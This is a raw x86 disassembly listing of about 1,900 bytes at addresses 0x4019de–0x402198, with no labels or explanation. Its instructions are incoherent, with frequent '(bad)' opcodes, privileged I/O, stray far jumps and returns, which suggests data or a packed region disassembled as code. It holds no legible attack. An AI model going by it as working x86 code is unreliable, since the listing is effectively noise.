  4019de:	push   ecx
  4019df:	push   cs
  4019e0:	pop    edx
  4019e1:	retf   0x814c
  4019e4:	jo     0x4019cb
  4019e6:	sbb    al,0x8e
  4019e8:	adc    al,ah
  4019ea:	and    eax,0x19c73036
  4019ef:	icebp  
  4019f0:	jmp    0xe575:0x7c60965e
  4019f7:	test   al,0xfb
  4019f9:	cwde   
  4019fa:	and    edx,0x344e0f5d
  401a00:	inc    ebx
  401a01:	push   ds
  401a02:	mov    al,ds:0x135565cd
  401a07:	xlat   BYTE PTR ds:[ebx]
  401a08:	mov    ch,0x16
  401a0a:	jle    0x4019a2
  401a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a0d:	mov    esp,eax
  401a0f:	mov    al,ds:0x60259db9
  401a14:	cmp    BYTE PTR [bx+0x55d3],dh
  401a19:	outs   dx,BYTE PTR ds:[esi]
  401a1a:	jge    0x401a6a
  401a1c:	adc    DWORD PTR [edx],ebp
  401a1e:	jno    0x4019df
  401a20:	dec    eax
  401a21:	dec    eax
  401a22:	push   cs
  401a23:	dec    edx
  401a24:	popa   
  401a25:	das    
  401a26:	sar    dx,cl
  401a29:	sub    DWORD PTR [edx],edx
  401a2b:	dec    edi
  401a2c:	ret    
  401a2d:	jle    0x401a16
  401a2f:	dec    eax
  401a30:	jmp    DWORD PTR [eax]
  401a32:	sub    cl,bh
  401a34:	add    ecx,DWORD PTR [esi-0x651d5c48]
  401a3a:	adc    al,0x48
  401a3c:	jbe    0x4019ee
  401a3e:	retf   
  401a3f:	fisub  WORD PTR [edx+0x169ab8b]
  401a45:	jp     0x401a9b
  401a47:	in     al,dx
  401a48:	rol    DWORD PTR [eax],cl
  401a4a:	jecxz  0x401a6c
  401a4c:	jecxz  0x401a7d
  401a4e:	push   ebp
  401a4f:	mov    esi,0x85faf7c8
  401a54:	popa   
  401a55:	pop    es
  401a56:	js     0x401aa4
  401a58:	pop    edx
  401a5a:	repnz std 
  401a5c:	mov    WORD PTR [eax],cs
  401a5e:	xor    esi,DWORD PTR [ebp+0x42ceaa5f]
  401a64:	inc    edx
  401a65:	xchg   ebp,eax
  401a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a67:	pusha  
  401a68:	int    0xdf
  401a6a:	jecxz  0x401a3e
  401a6c:	push   0xffffffbc
  401a6e:	jo     0x401aed
  401a70:	loop   0x401ab6
  401a72:	jmp    0x9e9f:0x9f7476f4
  401a79:	lahf   
  401a7a:	sub    al,0x3a
  401a7c:	fld    QWORD PTR [esi+0x59]
  401a7f:	xor    bh,BYTE PTR [edx]
  401a81:	or     al,0x85
  401a83:	call   0x4787:0x1d40722f
  401a8a:	jl     0x401a62
  401a8c:	(bad)  
  401a8e:	push   ss
  401a8f:	mov    dh,0xd3
  401a91:	mov    ch,0x48
  401a93:	jbe    0x401a6c
  401a95:	mov    edi,0x6e25fe56
  401a9a:	dec    edx
  401a9b:	xor    DWORD PTR [esi+0x29],edx
  401a9e:	sub    DWORD PTR [ebx-0x5a5e593],0xb99204aa
  401aa8:	in     eax,dx
  401aa9:	outs   dx,BYTE PTR ds:[esi]
  401aaa:	imul   esp,edx,0x84dcef9d
  401ab0:	push   edx
  401ab1:	in     eax,dx
  401ab2:	and    BYTE PTR [ebx-0x28],cl
  401ab5:	scas   al,BYTE PTR es:[edi]
  401ab6:	mov    ah,bh
  401ab8:	adc    BYTE PTR [edx-0xa1469be],ah
  401abe:	int3   
  401abf:	in     eax,0xcd
  401ac1:	cs call 0x4db8:0xc71a4719
  401ac9:	cmp    DWORD PTR [ebx],edi
  401acb:	add    eax,esi
  401acd:	hlt    
  401ace:	push   cs
  401acf:	push   esp
  401ad0:	mov    ebx,0x4a5a8082
  401ad5:	sub    esp,DWORD PTR ds:0xc614a12f
  401adb:	mov    bh,0x9c
  401add:	retf   
  401ade:	sub    dl,BYTE PTR [ebx]
  401ae0:	or     al,0x58
  401ae2:	pop    eax
  401ae3:	inc    ebx
  401ae4:	mov    al,0x65
  401ae6:	test   eax,0x9e35302b
  401aeb:	add    al,0x2
  401aed:	inc    ebx
  401aee:	fnstsw WORD PTR [ecx]
  401af0:	push   0xeae5b22d
  401af5:	xor    BYTE PTR [edi+0x436984d2],dh
  401afb:	push   ebx
  401afc:	pop    esi
  401afd:	mov    dl,al
  401aff:	sub    bl,BYTE PTR [eax]
  401b01:	or     eax,DWORD PTR [edi+0x17]
  401b04:	in     eax,0x65
  401b06:	push   0xee8d49d8
  401b0b:	mov    ebx,eax
  401b0d:	xor    BYTE PTR [ebx-0x40],ch
  401b10:	mov    ecx,0x8efa5552
  401b15:	push   ds
  401b16:	dec    ebp
  401b17:	push   es
  401b18:	pusha  
  401b19:	and    eax,0x93275d44
  401b1e:	xor    al,0xaa
  401b20:	pop    ds
  401b21:	lods   al,BYTE PTR ds:[esi]
  401b22:	mov    eax,ds:0x1b5a58fb
  401b27:	sbb    BYTE PTR [esp+edi*8+0xf006267],al
  401b2e:	inc    esp
  401b2f:	sbb    dl,bl
  401b31:	ds mov ch,0x86
  401b34:	add    BYTE PTR [eax-0x75],ch
  401b37:	adc    esi,esp
  401b39:	lds    ecx,FWORD PTR [ecx]
  401b3b:	cmp    ebx,DWORD PTR [ebx-0x52993361]
  401b41:	ret    
  401b42:	fild   QWORD PTR [ecx-0x34]
  401b45:	sahf   
  401b46:	mov    esp,0x64f0c73d
  401b4b:	jmp    0x6b160c50
  401b50:	pop    esp
  401b51:	mov    bh,0x59
  401b53:	xchg   esp,eax
  401b54:	mov    fs,esi
  401b56:	dec    ebx
  401b57:	mov    esp,0x560e7bd4
  401b5c:	cmp    BYTE PTR [edi],dl
  401b5e:	outs   dx,DWORD PTR gs:[esi]
  401b60:	repz pop ebp
  401b62:	cmc    
  401b63:	adc    cl,bh
  401b65:	sub    eax,0x2f6a2b20
  401b6a:	cmp    DWORD PTR [esi+0x5893cb23],edi
  401b70:	add    DWORD PTR [ebp-0x63],0xdbb27bb3
  401b77:	adc    ebx,edx
  401b79:	jmp    0x9859:0xce9aeb39
  401b80:	cwde   
  401b81:	dec    ebx
  401b82:	mov    esi,0x589a3af0
  401b87:	jne    0x401b35
  401b89:	push   es
  401b8a:	sti    
  401b8b:	mov    ebx,0x668a3fcc
  401b90:	dec    esi
  401b91:	jp     0x401b54
  401b93:	push   edx
  401b94:	rol    BYTE PTR [ecx],cl
  401b96:	sbb    eax,0x9e96bcdd
  401b9b:	rcr    edi,0xb8
  401b9e:	mov    ebx,0xcc746e5
  401ba3:	push   0x7c
  401ba5:	aaa    
  401ba6:	ret    
  401ba7:	mov    WORD PTR [ecx+0x4a],ss
  401baa:	inc    edx
  401bab:	ins    DWORD PTR es:[edi],dx
  401bac:	inc    ebp
  401bad:	lock repnz fidivr WORD PTR gs:[ecx-0x7e]
  401bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb4:	jo     0x401b3a
  401bb6:	(bad)  
  401bb7:	cmp    al,BYTE PTR [edx]
  401bb9:	push   cs
  401bba:	stos   DWORD PTR es:[edi],eax
  401bbb:	sub    esi,eax
  401bbd:	pop    edx
  401bbe:	cli    
  401bbf:	add    al,BYTE PTR [edi+0x1b]
  401bc2:	sbb    eax,0x6008fc4a
  401bc7:	and    BYTE PTR [edx+0x2e41156e],0x9f
  401bce:	popa   
  401bcf:	aas    
  401bd0:	pop    ebx
  401bd1:	push   esi
  401bd2:	mov    esp,0x1575d4a7
  401bd7:	call   0x6f73:0x324ee2cd
  401bde:	mov    bl,bh
  401be0:	jae    0x401ba7
  401be2:	or     al,0xd5
  401be4:	punpckhdq mm1,QWORD PTR [edx]
  401be7:	stos   BYTE PTR es:[di],al
  401be9:	pop    esp
  401bea:	push   esi
  401beb:	or     eax,0xfb09206
  401bf0:	push   0xffffffec
  401bf2:	cmp    BYTE PTR [eax],ch
  401bf4:	aas    
  401bf5:	scas   eax,DWORD PTR es:[edi]
  401bf6:	leave  
  401bf7:	cmp    al,0x3e
  401bf9:	fsub   QWORD PTR [ebx+ebx*8]
  401bfc:	jmp    FWORD PTR [eax-0x4c]
  401bff:	pusha  
  401c00:	test   eax,0xb5aa01cd
  401c05:	repnz out dx,eax
  401c07:	push   edx
  401c08:	pop    ecx
  401c09:	cdq    
  401c0a:	stos   BYTE PTR es:[edi],al
  401c0b:	adc    al,BYTE PTR [ecx-0x28]
  401c0e:	call   0x8214f71f
  401c13:	mov    ebx,ebp
  401c15:	cwde   
  401c16:	fcom   DWORD PTR [edi+0x25d3a153]
  401c1c:	jl     0x401c00
  401c1e:	sbb    DWORD PTR [ebx],edx
  401c20:	fs fwait
  401c22:	xlat   BYTE PTR ds:[ebx]
  401c23:	jecxz  0x401c74
  401c25:	(bad)  
  401c26:	rol    DWORD PTR [edi],cl
  401c28:	hlt    
  401c29:	fiadd  WORD PTR [edx+ecx*2-0x49]
  401c2d:	sbb    eax,0x76484a5c
  401c32:	loope  0x401c14
  401c34:	mov    dl,0x92
  401c36:	inc    esi
  401c37:	add    bh,BYTE PTR [ebp-0x1c]
  401c3a:	dec    ebp
  401c3b:	jmp    FWORD PTR [ebp-0x2a]
  401c3e:	ins    DWORD PTR es:[edi],dx
  401c3f:	ins    DWORD PTR es:[edi],dx
  401c40:	adc    DWORD PTR [ebx+eax*1+0x29072ae1],esi
  401c47:	mov    edi,0x3054cb81
  401c4c:	sbb    esi,0x32
  401c4f:	mov    edi,0x1eff7566
  401c54:	popa   
  401c55:	mov    DWORD PTR [edi-0x73544743],edi
  401c5b:	mov    esi,0xb876fb58
  401c60:	aad    0x1d
  401c62:	loope  0x401c13
  401c64:	xor    eax,0xfff1020a
  401c69:	icebp  
  401c6a:	pop    es
  401c6b:	cmp    dl,BYTE PTR [edx+ecx*8]
  401c6e:	rcr    BYTE PTR [esi],1
  401c70:	mov    bh,0x16
  401c72:	xchg   edi,eax
  401c73:	test   BYTE PTR [eax+0x52636bb0],ch
  401c79:	mov    bl,ch
  401c7b:	out    dx,al
  401c7c:	push   edx
  401c7d:	aaa    
  401c7e:	stc    
  401c7f:	test   BYTE PTR [ebp+0x3515585b],cl
  401c85:	dec    BYTE PTR [ebx-0x64446b1b]
  401c8b:	dec    ecx
  401c8c:	(bad)  
  401c8d:	inc    BYTE PTR [ecx+ecx*4+0x301196a1]
  401c94:	push   ebp
  401c95:	xor    eax,DWORD PTR [esi-0x1c]
  401c98:	add    DWORD PTR [bp+si],0x924ebb19
  401c9f:	xchg   ebp,eax
  401ca0:	jmp    FWORD PTR [edx-0x5475c3d7]
  401ca6:	fidiv  WORD PTR [edi*1+0xe30fa04]
  401cad:	and    esi,ebx
  401caf:	dec    esp
  401cb0:	add    BYTE PTR [esi+ecx*2],dh
  401cb3:	or     ebx,esi
  401cb5:	jne    0x401c71
  401cb7:	jnp    0x401d04
  401cb9:	mov    ch,0x99
  401cbb:	into   
  401cbc:	cmp    ebp,DWORD PTR [edi]
  401cbe:	mov    eax,0x923d7780
  401cc3:	xchg   ebp,eax
  401cc4:	mov    eax,ds:0xe923144
  401cc9:	div    esp
  401ccb:	push   0xe77db12d
  401cd0:	leave  
  401cd1:	pushf  
  401cd2:	btc    DWORD PTR [ebx],ecx
  401cd5:	scas   eax,DWORD PTR es:[edi]
  401cd6:	adc    al,0xe3
  401cd8:	hlt    
  401cd9:	pop    ebp
  401cda:	es mov ah,0x38
  401cdd:	into   
  401cde:	mov    ah,0x7
  401ce0:	cmp    al,0x13
  401ce2:	add    DWORD PTR [esi],0x9f8115f3
  401ce8:	add    bh,ah
  401cea:	stc    
  401ceb:	pop    eax
  401cec:	sub    BYTE PTR [ebp-0x31],cl
  401cef:	pop    esp
  401cf0:	gs int3 
  401cf2:	scas   al,BYTE PTR es:[edi]
  401cf3:	shr    ebp,0x4e
  401cf6:	cli    
  401cf7:	outs   dx,BYTE PTR ds:[esi]
  401cf8:	and    esi,ebp
  401cfa:	adc    eax,0x34
  401cfd:	cmc    
  401cfe:	xor    ebx,eax
  401d00:	ret    
  401d01:	cmp    al,0x60
  401d03:	ficom  DWORD PTR [edx+0x15]
  401d06:	loope  0x401d6d
  401d08:	rol    BYTE PTR [ecx-0x7c5071c4],1
  401d0e:	cmp    DWORD PTR ds:0xbd2c5a0,ecx
  401d14:	push   ebx
  401d15:	adc    DWORD PTR [esi+0x68],eax
  401d18:	daa    
  401d19:	or     eax,ecx
  401d1b:	sub    eax,ecx
  401d1d:	jnp    0x401cdb
  401d1f:	ret    
  401d20:	js     0x401d54
  401d22:	pop    eax
  401d23:	aam    0x7b
  401d25:	addr16 pop edx
  401d27:	ds (bad) 
  401d29:	shl    ebx,1
  401d2b:	mov    bh,0x7b
  401d2d:	pop    es
  401d2e:	aas    
  401d2f:	fidivr DWORD PTR [ecx+edx*4+0x7e91ad5d]
  401d36:	out    dx,al
  401d37:	pop    edi
  401d38:	pop    ebx
  401d39:	test   eax,0x3a02330b
  401d3e:	fsubr  QWORD PTR [edx-0x6f]
  401d41:	adc    eax,ebp
  401d43:	pop    esi
  401d44:	retf   
  401d45:	icebp  
  401d46:	dec    esp
  401d47:	push   edx
  401d48:	ins    BYTE PTR es:[edi],dx
  401d49:	mov    ecx,0xee7ed664
  401d4e:	fwait
  401d4f:	inc    ebx
  401d50:	cmc    
  401d51:	sub    BYTE PTR [ecx],bl
  401d53:	xor    eax,0x32412e2b
  401d58:	mov    eax,0x8e818b46
  401d5d:	xor    al,0xd9
  401d5f:	scas   eax,DWORD PTR es:[edi]
  401d60:	fsub   QWORD PTR [ebx+0x1c231311]
  401d66:	fimul  DWORD PTR [edx]
  401d68:	pop    esi
  401d69:	std    
  401d6a:	dec    esp
  401d6b:	aad    0xa0
  401d6d:	aam    0x2
  401d6f:	mov    bh,0xe5
  401d71:	outs   dx,BYTE PTR ds:[esi]
  401d72:	sahf   
  401d73:	lock out 0xde,al
  401d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d77:	inc    edi
  401d78:	jge    0x401ddf
  401d7a:	mov    ch,0xe6
  401d7c:	cs fcmovb st,st(1)
  401d7f:	(bad)  [eax-0x2e]
  401d82:	mov    bl,0xa3
  401d84:	mov    eax,ds:0x9da9aabf
  401d89:	test   BYTE PTR [edi],ah
  401d8b:	inc    esi
  401d8c:	int    0x90
  401d8e:	in     al,0x98
  401d90:	std    
  401d91:	cmp    BYTE PTR ss:[edi+0x40],ah
  401d95:	or     al,0x12
  401d97:	sub    BYTE PTR [eax],al
  401d99:	mov    edx,0xd68b48da
  401d9e:	sbb    DWORD PTR [edi-0xd659895],ebx
  401da4:	js     0x401d3b
  401da6:	div    DWORD PTR [esi+0x3]
  401da9:	pop    ebp
  401daa:	jp     0x401dfe
  401dac:	mov    esp,0x3439dd1b
  401db1:	(bad)  
  401db2:	mov    dh,0x6f
  401db4:	aad    0x26
  401db6:	mov    ebx,0x763b1a6b
  401dbb:	(bad)
  401dbf:	ins    DWORD PTR es:[edi],dx
  401dc0:	lahf   
  401dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dc2:	stos   DWORD PTR es:[edi],eax
  401dc3:	adc    edx,ebp
  401dc5:	mov    ebp,0x9ede3a22
  401dca:	push   edi
  401dcb:	pop    edi
  401dcc:	loopne 0x401e39
  401dce:	or     DWORD PTR ds:0x43ef2730,esi
  401dd4:	or     edx,DWORD PTR [esi]
  401dd6:	inc    edx
  401dd7:	xchg   ebp,eax
  401dd8:	jge    0x401e00
  401dda:	daa    
  401ddb:	loopne 0x401e00
  401ddd:	jns    0x401e43
  401ddf:	mov    edi,DWORD PTR [ebx]
  401de1:	fucomip st,st(0)
  401de3:	mov    edi,0xb5c6c93c
  401de8:	jl     0x401dd6
  401dea:	in     eax,dx
  401deb:	out    0x4,al
  401ded:	sar    ah,1
  401def:	adc    cl,BYTE PTR [ebp+0x14354087]
  401df5:	xchg   BYTE PTR [ebp+0x71],ah
  401df8:	pushf  
  401df9:	or     DWORD PTR [ecx],0x3158b8af
  401dff:	ja     0x401e1d
  401e01:	cmc    
  401e02:	cmp    bl,dh
  401e04:	es jne 0x401dff
  401e07:	int3   
  401e08:	mov    bl,0xa0
  401e0a:	dec    ecx
  401e0b:	icebp  
  401e0c:	push   esp
  401e0d:	adc    al,0x36
  401e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e10:	int3   
  401e11:	dec    edi
  401e12:	mov    ds:0x51ad7829,eax
  401e17:	adc    BYTE PTR [eax+0x72],ch
  401e1a:	sar    dh,0x75
  401e1d:	mov    ecx,0x3b21e013
  401e22:	pop    ds
  401e23:	mov    eax,0x10ec2b22
  401e28:	xor    DWORD PTR gs:[eax-0x6ba955e6],edi
  401e2f:	iret   
  401e30:	jmp    0xbb51:0x2b827dcc
  401e37:	rcr    DWORD PTR [eax],0xc5
  401e3a:	lock add BYTE PTR [edx+0x59],bl
  401e3e:	cmp    bl,BYTE PTR [edx-0xab27efc]
  401e44:	in     al,0xc5
  401e46:	mov    edx,0xf9434470
  401e4b:	add    eax,ebx
  401e4d:	in     eax,dx
  401e4e:	adc    DWORD PTR [ebx+0x6b610e3e],esi
  401e54:	inc    ebx
  401e55:	mov    edx,0x31d79721
  401e5a:	cwde   
  401e5b:	sbb    esp,ebx
  401e5d:	test   al,0x2c
  401e5f:	das    
  401e60:	ret    
  401e61:	jp     0x401ed1
  401e63:	sub    BYTE PTR [eax-0x4316135],0x91
  401e6a:	rol    ecx,1
  401e6c:	ja     0x401e2d
  401e6e:	sbb    eax,0x44e1ae98
  401e73:	mov    ds:0xaa766d70,eax
  401e78:	pop    ecx
  401e79:	or     ah,ah
  401e7b:	cli    
  401e7c:	adc    al,BYTE PTR [eax-0x460dddf3]
  401e82:	mov    ?,WORD PTR [esi]
  401e84:	iret   
  401e85:	pop    ebp
  401e86:	mov    BYTE PTR [ebp-0x6],ah
  401e89:	mov    eax,ds:0xdfd9ecdb
  401e8e:	jns    0x401eb7
  401e90:	mov    WORD PTR [ebp-0x2e],ds
  401e93:	mov    ds:0xa8da4b57,eax
  401e98:	iret   
  401e99:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  401e9b:	mov    al,ds:0x6a041c0f
  401ea0:	pop    ecx
  401ea1:	push   ebp
  401ea2:	lods   eax,DWORD PTR ds:[esi]
  401ea3:	pop    esi
  401ea4:	loop   0x401ed2
  401ea6:	out    dx,eax
  401ea7:	and    bl,BYTE PTR [ebp+esi*8+0x57de9b3a]
  401eae:	inc    edi
  401eaf:	js     0x401efc
  401eb1:	adc    cl,BYTE PTR ds:0x10d230bc
  401eb7:	xor    al,BYTE PTR [esi-0x65d6adf]
  401ebd:	xchg   esi,eax
  401ebe:	dec    ecx
  401ebf:	mov    ebx,0x57645f77
  401ec4:	pop    ebx
  401ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec6:	call   FWORD PTR ds:0x1d7d806a
  401ecc:	push   ss
  401ecd:	retf   
  401ece:	mov    bl,0x69
  401ed0:	xchg   ebp,eax
  401ed1:	jp     0x401ea1
  401ed3:	div    ecx
  401ed5:	mov    ebp,0xa540010
  401eda:	call   0x5881:0xfc7f58bd
  401ee1:	(bad)  
  401ee4:	test   cl,ah
  401ee6:	cwde   
  401ee7:	mov    al,0x60
  401ee9:	gs mov bh,0x10
  401eec:	sub    BYTE PTR [edi-0x4da7e7e],0xe
  401ef3:	(bad)  
  401ef4:	div    BYTE PTR [edi+esi*1-0x5d14ce5a]
  401efb:	jge    0x401ea4
  401efd:	pop    es
  401efe:	mov    ebx,0xb5678ed4
  401f03:	cmp    DWORD PTR [ebx-0x72af4b23],ecx
  401f09:	push   es
  401f0a:	lea    esp,[ebx]
  401f0c:	ror    BYTE PTR ds:0xc80520fe,1
  401f12:	in     al,0xa6
  401f14:	dec    eax
  401f15:	add    edi,ebp
  401f17:	int3   
  401f18:	adc    BYTE PTR [edi],cl
  401f1a:	xor    eax,0x6f657c0c
  401f1f:	push   esi
  401f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f21:	lahf   
  401f22:	mov    eax,ds:0x3d6f1648
  401f27:	repnz inc edi
  401f29:	pop    eax
  401f2a:	pop    edx
  401f2b:	push   edx
  401f2c:	inc    edx
  401f2d:	push   ebp
  401f2e:	test   al,dl
  401f30:	and    dl,BYTE PTR [ecx]
  401f32:	retf   
  401f33:	stc    
  401f34:	ss lahf 
  401f36:	cwde   
  401f37:	fucomip st,st(1)
  401f39:	cmp    ebp,DWORD PTR ss:[ebx]
  401f3c:	jae    0x401f4b
  401f3e:	data16 mov dh,0xa7
  401f41:	dec    ecx
  401f42:	inc    esi
  401f43:	jge    0x401ef5
  401f45:	sbb    DWORD PTR [edx-0xf],esp
  401f48:	scas   al,BYTE PTR es:[edi]
  401f49:	pop    ebp
  401f4a:	and    eax,DWORD PTR [edx-0x5]
  401f4d:	add    al,0x69
  401f4f:	sub    dl,ch
  401f51:	popf   
  401f52:	push   0xffffffc7
  401f54:	mov    ah,0x6b
  401f56:	add    BYTE PTR [ebx],ch
  401f58:	mov    ecx,0x4034f5f0
  401f5d:	pop    ds
  401f5e:	mov    ch,0x6f
  401f61:	icebp  
  401f62:	sti    
  401f63:	cmc    
  401f64:	push   esi
  401f65:	lahf   
  401f66:	aad    0xfd
  401f68:	aad    0xfc
  401f6a:	arpl   bx,ax
  401f6c:	ins    DWORD PTR es:[edi],dx
  401f6d:	and    BYTE PTR [ebx-0x60f11951],bl
  401f73:	out    dx,eax
  401f74:	out    0x14,al
  401f76:	fcomp  DWORD PTR [eax-0x1]
  401f79:	inc    edi
  401f7a:	jo     0x401fce
  401f7c:	(bad)  
  401f7d:	les    esi,FWORD PTR [edx]
  401f7f:	shl    DWORD PTR [ebx-0x50],1
  401f82:	cmc    
  401f83:	je     0x401f64
  401f85:	jo     0x401f73
  401f87:	lods   eax,DWORD PTR ds:[esi]
  401f88:	or     BYTE PTR [edi],al
  401f8a:	not    DWORD PTR [esi-0x69]
  401f8d:	sbb    eax,0x17b9cc15
  401f92:	rcr    DWORD PTR [eax+0x2568b66d],1
  401f98:	gs (bad) 
  401f9a:	or     BYTE PTR [esi-0x23e0ea2c],0xb2
  401fa1:	pop    ebx
  401fa2:	repz rcr BYTE PTR [eax+0x5f],cl
  401fa6:	pusha  
  401fa7:	add    cl,BYTE PTR ds:0xd630f2cb
  401fad:	adc    BYTE PTR [edx-0x1c],0xb
  401fb1:	and    ecx,DWORD PTR [esi]
  401fb3:	and    esp,DWORD PTR ds:0xef1bee56
  401fb9:	dec    eax
  401fba:	jne    0x402035
  401fbc:	in     al,0x43
  401fbe:	sahf   
  401fbf:	inc    esi
  401fc0:	sbb    al,0xd
  401fc2:	shl    BYTE PTR [ebx+0xa],1
  401fc5:	dec    esp
  401fc6:	add    al,0x39
  401fc8:	outs   dx,BYTE PTR ds:[esi]
  401fc9:	loop   0x401f66
  401fcb:	dec    ebp
  401fcc:	pushf  
  401fcd:	mov    ch,0xc8
  401fcf:	sbb    eax,esp
  401fd1:	loopne 0x402026
  401fd3:	pop    es
  401fd4:	or     ebp,DWORD PTR [eax-0x4bd56f54]
  401fda:	daa    
  401fdb:	fadd   DWORD PTR [edx]
  401fdd:	pop    esp
  401fde:	clc    
  401fdf:	mov    WORD PTR [ebx],es
  401fe1:	lock jg 0x40205b
  401fe4:	(bad)  
  401fe5:	leave  
  401fe6:	sbb    edi,esi
  401fe8:	test   edx,edi
  401fea:	sub    BYTE PTR [ebx+0x13],0xc7
  401fee:	cdq    
  401fef:	add    bl,BYTE PTR [edi]
  401ff1:	and    DWORD PTR [esp+edx*4-0x10],ebp
  401ff5:	adc    edx,DWORD PTR [ebx-0x4dd28241]
  401ffb:	stos   DWORD PTR es:[edi],eax
  401ffc:	cmp    BYTE PTR [esi+0xd],ah
  401fff:	xor    DWORD PTR [ebp-0x35742e97],0x217e166
  402009:	clc    
  40200a:	clc    
  40200b:	jl     0x40205e
  40200d:	pop    eax
  40200e:	icebp  
  40200f:	ret    
  402010:	dec    esi
  402011:	arpl   bx,bx
  402013:	fmul   QWORD PTR [edx+0x75]
  402016:	popa   
  402017:	aam    0x28
  402019:	popf   
  40201a:	repz lahf 
  40201c:	ins    BYTE PTR es:[edi],dx
  40201d:	imul   ebx,DWORD PTR [ebx+ebp*4+0x1fb869f8],0xc44ed477
  402028:	push   cs
  402029:	or     bl,dl
  40202b:	sub    dl,bl
  40202d:	add    al,0xb2
  40202f:	mov    eax,DWORD PTR [edx-0x26c787f]
  402035:	push   esp
  402036:	test   cl,dh
  402038:	sub    DWORD PTR [edx+eax*1],ebp
  40203b:	jne    0x401fe4
  40203d:	dec    esi
  40203e:	popa   
  40203f:	fadd   QWORD PTR [ebp-0x4e]
  402042:	sub    DWORD PTR [ebx-0x5],0xfffffff2
  402046:	pop    ebp
  402047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402048:	pop    esp
  402049:	lea    edi,[esp+eax*4]
  40204c:	sti    
  40204d:	adc    BYTE PTR [edx+0x107a284d],dl
  402053:	in     eax,0x4b
  402055:	loope  0x402018
  402057:	(bad)  
  402058:	fnstenv [esi+esi*1]
  40205b:	scas   eax,DWORD PTR es:[edi]
  40205c:	sbb    cl,al
  40205e:	jle    0x402019
  402060:	sub    dh,ah
  402062:	retf   0x1588
  402065:	cmc    
  402066:	sbb    cl,BYTE PTR [ecx]
  402068:	add    eax,0x539e66fa
  40206d:	test   DWORD PTR [edx],esp
  40206f:	add    BYTE PTR [esi+ebp*4-0x18],ch
  402073:	dec    edi
  402074:	xchg   ebx,eax
  402075:	push   ecx
  402076:	nop
  402077:	(bad)  
  402078:	cld    
  402079:	add    eax,0x2695eacc
  40207e:	mov    bl,bh
  402080:	int    0x9b
  402082:	setnp  BYTE PTR [edx+0x1dccab11]
  402089:	hlt    
  40208a:	and    BYTE PTR [ebx-0x2e],cl
  40208d:	cmc    
  40208e:	addr16 cmp eax,0x7901e7e5
  402094:	retf   0xcd
  402097:	neg    BYTE PTR [edi-0xe9601d5]
  40209d:	les    esp,FWORD PTR [eax]
  40209f:	mov    esi,0xbbac1f5b
  4020a4:	xor    eax,0xbc5b9c32
  4020a9:	pushf  
  4020aa:	adc    ah,BYTE PTR [ecx+0x12]
  4020ad:	bound  esp,QWORD PTR [esp+ebp*1]
  4020b0:	cmp    DWORD PTR [edi+eiz*8-0x4d5a422],ebp
  4020b7:	je     0x40205c
  4020b9:	adc    DWORD PTR [ebx],ecx
  4020bb:	es jmp 0x4020ef
  4020be:	pop    ebx
  4020bf:	xchg   ebp,eax
  4020c0:	xchg   edi,eax
  4020c1:	adc    eax,DWORD PTR [edx+edx*8]
  4020c4:	fisttp QWORD PTR [edx-0x4]
  4020c7:	sbb    eax,0x5f91f88
  4020cc:	loope  0x40209b
  4020ce:	hlt    
  4020cf:	xor    ecx,DWORD PTR [ebx]
  4020d1:	sbb    dl,BYTE PTR [eax-0x53]
  4020d4:	out    0x3e,al
  4020d6:	enter  0x705e,0x55
  4020da:	xchg   ebp,eax
  4020db:	int3   
  4020dc:	jo     0x402099
  4020de:	add    DWORD PTR [edi-0x54f8c936],eax
  4020e4:	cmp    BYTE PTR [eax+0x43],bh
  4020e7:	pop    ecx
  4020e8:	mov    ch,0xee
  4020ea:	xor    eax,0xda82586d
  4020ef:	sub    eax,ebx
  4020f1:	pop    ebp
  4020f2:	cli    
  4020f3:	ins    DWORD PTR es:[edi],dx
  4020f4:	xchg   ebx,eax
  4020f5:	sbb    ebx,DWORD PTR ds:0xd879bef2
  4020fb:	xor    al,0x17
  4020fd:	out    dx,al
  4020fe:	sbb    al,0x31
  402100:	xchg   esp,eax
  402101:	sbb    eax,0x5e2987be
  402106:	pop    esi
  402107:	mov    dl,0x2f
  402109:	or     esp,0x77
  40210c:	jmp    0x759f9c30
  402111:	push   edi
  402112:	dec    esi
  402113:	shl    DWORD PTR [esi-0x8],cl
  402116:	push   0xcc2cc983
  40211b:	arpl   WORD PTR [edi+esi*8-0x2a],di
  40211f:	stc    
  402120:	(bad)  
  402121:	shl    DWORD PTR [eax-0x12],cl
  402124:	test   DWORD PTR [eax+0x79bfd543],ebp
  40212a:	rcr    BYTE PTR [ecx+0x344b394f],1
  402130:	in     al,dx
  402131:	test   al,0xae
  402133:	in     al,dx
  402134:	cmp    ecx,DWORD PTR [edi]
  402136:	pop    ebp
  402137:	ret    0x1079
  40213a:	xchg   ecx,eax
  40213b:	cmp    dl,ah
  40213d:	(bad)  
  40213f:	inc    edi
  402140:	mov    BYTE PTR ds:0x60765fdb,bl
  402146:	loope  0x402154
  402148:	fcmovu st,st(6)
  40214a:	pop    es
  40214b:	sub    esi,ebx
  40214d:	mov    esp,0x4d918399
  402152:	ja     0x4020e1
  402154:	jmp    0x4021ba
  402156:	cmc    
  402157:	int3   
  402158:	repz cdq 
  40215a:	add    eax,0xc74bc2ba
  40215f:	jle    0x4021aa
  402161:	out    dx,eax
  402162:	shl    DWORD PTR [ebx-0x68bd8783],cl
  402168:	test   BYTE PTR [edx],bh
  40216a:	jne    0x4021a6
  40216c:	jae    0x402123
  40216e:	(bad)  
  40216f:	sbb    DWORD PTR [edx-0x22ab9b0b],ebp
  402175:	cwde   
  402176:	xor    eax,0x51d7f3ed
  40217b:	retf   
  40217c:	add    dl,cl
  40217e:	(bad)  
  40217f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402180:	sub    al,0xd2
  402182:	jb     0x40216f
  402184:	sbb    ah,al
  402186:	test   DWORD PTR [edx-0x6e587b63],0xa437ddb
  402190:	pop    ebp
  402191:	pusha  
  402192:	jne    0x40217a
  402194:	jne    0x402163
  402196:	add    al,0x5b
  402198:	xor    BYTE PTR [eax],0x1a
